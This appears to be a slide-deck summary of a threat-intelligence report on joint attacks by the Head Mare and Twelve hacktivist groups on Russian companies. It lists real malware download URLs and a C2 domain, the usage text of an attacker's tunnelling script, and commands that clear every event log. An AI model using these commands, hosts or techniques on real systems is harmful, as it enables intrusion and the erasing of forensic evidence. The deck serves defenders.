Slide 1: Overview & Context
Title: Head Mare and Twelve – Joint Attacks on Russian Entities
Publication Date: 13 March 2025
Focus:
Collaboration between two hacktivist groups
Targeting Russian companies using both established and new techniques
Integration of PowerShell-based tools alongside publicly available and leaked malware
Slide 2: Timeline of Operations
August 2024:
Introduction of PhantomJitter Backdoor:
– New remote command execution tool added to the attackers’ arsenal
September 2024:
Attack Wave Against Russian Companies:
– Multiple incidents reveal overlapping indicators of compromise (IOCs)
– Evidence suggests sharing of tactics and tools between Head Mare and Twelve
Post-September 2024:
Method Refinement:
– Expanded access vectors (phishing, compromised contractors, RDP)
– Enhanced persistence and pivoting techniques to bypass defenses
(Reference: )

Slide 3: Exploited Vulnerabilities & Initial Access
Software Vulnerabilities:
WinRAR Vulnerability (CVE-2023-38831):
– Exploited via phishing emails carrying malicious attachments
Microsoft Exchange ProxyLogon (CVE-2021-26855):
– Despite patches, outdated systems remain vulnerable
– Enables attackers to execute remote commands (e.g., download the CobInt backdoor)
Additional Techniques:
Compromised Trusted Relationships:
– Infiltration through contractors with access to business automation platforms
– Exploitation of exposed RDP connections
Key Takeaway:
– Attackers diversify entry points to maximize access chances.
Slide 4: Detailed Methods & Technical Techniques
Tool Integration & Malware:
Legacy Tools:
– mimikatz, ADRecon, secretsdump, ProcDump, PSExec, smbexec, wmiexec, etc.
New & Shared Tools:
– CobInt Backdoor: Previously seen in Twelve’s attacks; now leveraged by Head Mare
– PhantomJitter Backdoor: Introduced in August 2024 for remote command execution
Initial Access Approaches:
Phishing & Social Engineering:
– Use of malicious attachments exploiting WinRAR vulnerabilities
Exploitation of Vulnerabilities:
– Utilizing ProxyLogon to download malicious payloads
Persistence Mechanisms:
Creation of New Privileged Users:
– On business automation servers to maintain remote access
Installation of Tunneling Tools:
– Deploying Localtonet via NSSM to ensure services remain active
Pivoting:
– Employing custom PowerShell scripts to install and configure tunneling utilities (Gost, cloudflared) that allow the attackers to bypass network restrictions
Slide 5: Code & Automation – PowerShell Scripts in Action
Proxy Script (proxy.ps1):
Purpose:
– Download and extract remote archives
– Install tunneling tools as Windows services
Key Parameters:
– -r for remote archive download, -p for setting port, -t for cloudflared token, and -u for uninstallation
Snippet Highlights:
powershell
Copy
Usage: .\proxy.ps1 -r https://<site>.com/archive.zip -p gost_port -t cloudflared_token
Parameters:
  -l       Extract archive locally.
  -r       Download and extract archive remotely.
  -p       Specify the port for the gost.
  -t       Specify the token for the cloudflared.
  -u       Uninstall gost & cloudflared.
  -h       Show help message.
Service Installation Functions:
Setup-Gost-Service:
– Reads and modifies an XML configuration to update port settings
– Installs and starts Gost as a service
Setup-Cloudflared-Service:
– Automates the installation of cloudflared as a Windows service
– Configures it using parameters provided at runtime
Automation Benefits:
– Enables stealthy deployment and removal of malware artifacts
– Facilitates rapid pivoting and remote control through standardized service management
Slide 6: Command & Control (C2) and Network Pivoting
C2 Infrastructure:
PhantomJitter Backdoor:
– Downloads from URLs such as http://45.87.246.34:443/calc.exe and http://185.158.248.107:443/calc.exe
– Establishes a direct connection for executing remote commands
CobInt Backdoor:
– Connects to C2 servers via domains like 360nvidia.com
Pivoting Techniques:
Use of Tunneling Tools:
– Gost: Sets up secure, flexible network proxies
– Cloudflared: Tunnels traffic via the Cloudflare network to bypass firewalls and NAT
– Localtonet: Provides reverse proxy capabilities ensuring persistent access
Custom Script Functionality:
– The proxy.ps1 script simplifies the setup of these tools, ensuring seamless pivoting across compromised networks
Slide 7: Anti-Detection & Stealth Techniques
Masquerading:
Renaming Executables:
– Malicious binaries are given names of legitimate system files (e.g., wusa.exe, winuac.exe, winsw.exe)
Example:
– cmd.exe renamed to log.exe to hide its true function
Log Clearing & Service Removal:
PowerShell Commands to Clear Traces:
powershell
Copy
stop-service -name <servicename>
remove-service -name <servicename>
sc stop <servicename>
sc delete <servicename>
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
Rationale:
– Prevents forensic detection by erasing evidence of malicious activities
Artifact Removal:
– The proxy script also includes commands to uninstall services and delete associated files and logs, thereby erasing its footprint after execution
Slide 8: Impact on Organizations & Final Considerations
Target Profile:
Russian Companies:
– Particularly those using outdated systems such as Microsoft Exchange 2016 and Windows Server 2012 R2
Business Automation Platforms:
– Exploited through compromised contractors and vulnerable RDP endpoints
Broader Consequences:
Security & Financial Risk:
– Even without precise numbers, the scale suggests a significant threat to critical infrastructures
Operational Disruption:
– The use of ransomware elements (e.g., LockBit 3.0, Babuk) alongside data exfiltration indicates potential for high-impact financial and operational losses
Final Thought:
– The collaboration between Head Mare and Twelve, along with their evolving toolset and methods, underscores the importance of timely patch management, continuous monitoring, and layered security strategies to mitigate such advanced threats.
Slide 9: Conclusion
Evolving Threat Landscape:
– Hacktivist groups are increasingly merging tactics and sharing tools, making detection and defense more challenging.
Defense Imperative:
– Organizations must address legacy vulnerabilities, monitor for anomalous network activity, and employ robust incident response strategies.
